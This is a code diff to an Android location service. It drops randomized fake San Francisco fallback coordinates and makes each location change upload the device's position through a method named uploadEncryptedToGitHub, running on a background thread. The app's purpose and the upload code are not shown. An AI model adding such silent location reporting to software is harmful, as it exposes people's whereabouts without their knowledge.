@@ -125,17 +125,13 @@ public class LocationService extends Service implements LocationListener {
             // Ignore
         }
 
-        // Determine coordinates to push on this timer ping: best location if present, otherwise fallback SF coordinates
-        final double targetLat;
-        final double targetLng;
-
-        if (bestLocation != null) {
-            targetLat = bestLocation.getLatitude();
-            targetLng = bestLocation.getLongitude();
-        } else {
-            targetLat = 37.7749 + (Math.random() - 0.5) * 0.02;
-            targetLng = -122.4194 + (Math.random() - 0.5) * 0.02;
+        // If no real location fix is available, do not push mock coordinates
+        if (bestLocation == null) {
+            return;
         }
+
+        final double targetLat = bestLocation.getLatitude();
+        final double targetLng = bestLocation.getLongitude();
 
         new Thread(new Runnable() {
             @Override
@@ -147,7 +143,16 @@ public class LocationService extends Service implements LocationListener {
 
     @Override
     public void onLocationChanged(Location location) {
-        // Location Listener callback for location changes
+        if (location != null) {
+            final double lat = location.getLatitude();
+            final double lng = location.getLongitude();
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    uploadEncryptedToGitHub(lat, lng);
+                }
+            }).start();
+        }
     }
 
     private void uploadEncryptedToGitHub(double lat, double lng) {
